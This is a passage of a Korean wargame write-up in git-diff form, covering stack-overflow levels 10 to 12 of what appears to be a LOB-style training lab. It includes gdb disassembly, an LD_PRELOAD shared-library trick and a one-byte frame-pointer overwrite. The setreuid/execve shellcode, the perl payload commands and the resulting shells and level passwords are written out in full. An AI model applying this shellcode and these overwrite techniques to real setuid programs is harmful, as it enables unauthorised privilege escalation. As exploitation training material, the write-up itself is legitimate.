@@ -933,4 +933,157 @@ $
 알아낸 lv10 비번 : silver bullet
 
 ## lv 10
+gdb로 lv11가 무슨 프로그램인지 확인해보자.
+```
+   0x08048470 <+0>:	push   ebp
+   0x08048471 <+1>:	mov    ebp,esp
+   0x08048473 <+3>:	sub    esp,0x2c
+   0x08048476 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804847a <+10>:	jg     0x8048493 <main+35>
+   0x0804847c <+12>:	push   0x8048570
+   0x08048481 <+17>:	call   0x8048378 <printf@plt>
+   0x08048486 <+22>:	add    esp,0x4
+   0x08048489 <+25>:	push   0x0
+   0x0804848b <+27>:	call   0x8048388 <exit@plt>
+   0x08048490 <+32>:	add    esp,0x4
+   0x08048493 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048496 <+38>:	add    eax,0x4
+   0x08048499 <+41>:	mov    edx,DWORD PTR [eax]
+   0x0804849b <+43>:	add    edx,0x2f
+   0x0804849e <+46>:	cmp    BYTE PTR [edx],0xff
+   0x080484a1 <+49>:	je     0x80484c0 <main+80>
+   0x080484a3 <+51>:	push   0x804857c
+   0x080484a8 <+56>:	call   0x8048378 <printf@plt>
+   0x080484ad <+61>:	add    esp,0x4
+   0x080484b0 <+64>:	push   0x0
+   0x080484b2 <+66>:	call   0x8048388 <exit@plt>
+   0x080484b7 <+71>:	add    esp,0x4
+   0x080484ba <+74>:	lea    esi,[esi+0x0]
+   0x080484c0 <+80>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484c3 <+83>:	add    eax,0x4
+   0x080484c6 <+86>:	mov    edx,DWORD PTR [eax]
+   0x080484c8 <+88>:	push   edx
+   0x080484c9 <+89>:	lea    eax,[ebp-0x28]
+   0x080484cc <+92>:	push   eax
+   0x080484cd <+93>:	call   0x80483a8 <strcpy@plt>
+   0x080484d2 <+98>:	add    esp,0x8
+   0x080484d5 <+101>:	lea    eax,[ebp-0x28]
+   0x080484d8 <+104>:	push   eax
+   0x080484d9 <+105>:	push   0x8048599
+   0x080484de <+110>:	call   0x8048378 <printf@plt>
+   0x080484e3 <+115>:	add    esp,0x8
+   0x080484e6 <+118>:	push   0x2c
+   0x080484e8 <+120>:	push   0x0
+   0x080484ea <+122>:	lea    eax,[ebp-0x28]
+   0x080484ed <+125>:	push   eax
+   0x080484ee <+126>:	call   0x8048398 <memset@plt>
+   0x080484f3 <+131>:	add    esp,0xc
+   0x080484f6 <+134>:	lea    eax,[ebp-0x28]
+   0x080484f9 <+137>:	mov    edx,0xffffdfc8
+   0x080484fe <+142>:	mov    ecx,edx
+   0x08048500 <+144>:	sub    ecx,eax
+   0x08048502 <+146>:	mov    eax,ecx
+   0x08048504 <+148>:	push   eax
+   0x08048505 <+149>:	push   0x0
+   0x08048507 <+151>:	lea    eax,[ebp-0x28]
+   0x0804850a <+154>:	lea    edx,[eax+0x30]
+   0x0804850d <+157>:	push   edx
+   0x0804850e <+158>:	call   0x8048398 <memset@plt>
+   0x08048513 <+163>:	add    esp,0xc
+   0x08048516 <+166>:	leave  
+   0x08048517 <+167>:	ret 
+```
+이번에는 ret부분하나를 제외하고는 모두 초기화가 되어버렸다.  
+다 초기화 되었다고는 하나 라이브러리 영역은 살아있음을 확인 할 수 있었다.  
+
+```
+__LD_PRELOAD__
+프로세스 실행 과정 중 라이브러리를 로딩 할때, LD_PRELOAD 변수가 설정되어 있으면 해당 변수에 지정된
+라이브러리를 먼저 로딩하고, 이중 libc 함수명과 동일한 함수가 있다면 해당 함수를 먼저 호출해 준다.
+```
+LD_PRELOAD를 이용하여 라이브러리 영역에 쉘코드를 넣어주면 문제를 해결할 수 있을것이라 생각을 했다.   
+따라서 아래와 같이 쉘코드를 이름으로하는 공유라이브러리를 하나 생성해주었고 ret주소에 새로 생성하여 적용시킨 공유라이브러리 주소를 넣어주었다.
+```
+lv10@ubuntu:~$ vi shellcode.c
+lv10@ubuntu:~$ cat shellcode.c 
+#include <stdio.h>
+int main(){}
+
+gcc -fPIC -shared a.c -o `perl -e 'print "\x90"x100,"\x66\xb8\xf3\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+lv10@ubuntu:~$ export LD_PRELOAD=`perl -e 'print "/home/lv10/","\x90"x100, "\x66\xb8\xf3\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+lv10@ubuntu:~$ ./lv11 `perl -e 'print "a"x44,"\xe4\xbe\xff\xff"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+$ whoami
+lv11
+$ my-pass
+stacking champion
+$ 
+```
+알아낸 lv11 비번 : stacking champion
 ## lv 11
+gdb로 lv12가 무슨 프로그램인지 확인해보자.
+```
+disass main
+   0x0804846c <+0>:	push   ebp
+   0x0804846d <+1>:	mov    ebp,esp
+   0x0804846f <+3>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048473 <+7>:	jg     0x8048490 <main+36>
+   0x08048475 <+9>:	push   0x8048504
+   0x0804847a <+14>:	call   0x8048354 <printf@plt>
+   0x0804847f <+19>:	add    esp,0x4
+   0x08048482 <+22>:	push   0x0
+   0x08048484 <+24>:	call   0x8048364 <exit@plt>
+   0x08048489 <+29>:	add    esp,0x4
+   0x0804848c <+32>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048490 <+36>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048493 <+39>:	add    eax,0x4
+   0x08048496 <+42>:	mov    edx,DWORD PTR [eax]
+   0x08048498 <+44>:	push   edx
+   0x08048499 <+45>:	call   0x8048440 <problem_child>
+   0x0804849e <+50>:	add    esp,0x4
+   0x080484a1 <+53>:	leave  
+   0x080484a2 <+54>:	ret 
+```
+```
+disass problem_child
+   0x08048440 <+0>:	push   ebp
+   0x08048441 <+1>:	mov    ebp,esp
+   0x08048443 <+3>:	sub    esp,0x28
+   0x08048446 <+6>:	push   0x29
+   0x08048448 <+8>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x0804844b <+11>:	push   eax
+   0x0804844c <+12>:	lea    eax,[ebp-0x28]
+   0x0804844f <+15>:	push   eax
+   0x08048450 <+16>:	call   0x8048374 <strncpy@plt>
+   0x08048455 <+21>:	add    esp,0xc
+   0x08048458 <+24>:	lea    eax,[ebp-0x28]
+   0x0804845b <+27>:	push   eax
+   0x0804845c <+28>:	push   0x8048500
+   0x08048461 <+33>:	call   0x8048354 <printf@plt>
+   0x08048466 <+38>:	add    esp,0x8
+   0x08048469 <+41>:	leave  
+   0x0804846a <+42>:	ret  
+```
+이번 문제는 함수가 main외에 problem_child로 2개이다.  
+또한 problem_child함수의 ebp값 중 단 1바이트만 변경이 가능하다.  
+
+즉, Frame pointer overwriting 기법을 사용하면 문제를 해결 할 수 있음을 알 수 있다.
+
+또한 이 문제는 정확한 버퍼의 주소값이 필요하므로 gdb를 통해 알아낸 주소값이 아닌 세그먼트 폴트로 생긴   
+core파일을 분석하여 정확한 주소를 찾아야한다.
+
+```
+export shellcode=`perl -e 'print "\x90"x1000,"\x66\xb8\xf4\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+lv11@ubuntu:~$ ./lv12 `perl -e 'print "a"x36,"\x89\xda\xff\xff", "\x94"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��������������
+$ whoami
+lv12
+$ id
+uid=1012(lv12) gid=1011(lv11) groups=1011(lv11)
+$ my-pass
+give me a job
+```
+
+알아낸 lv12 비번 : give me a job
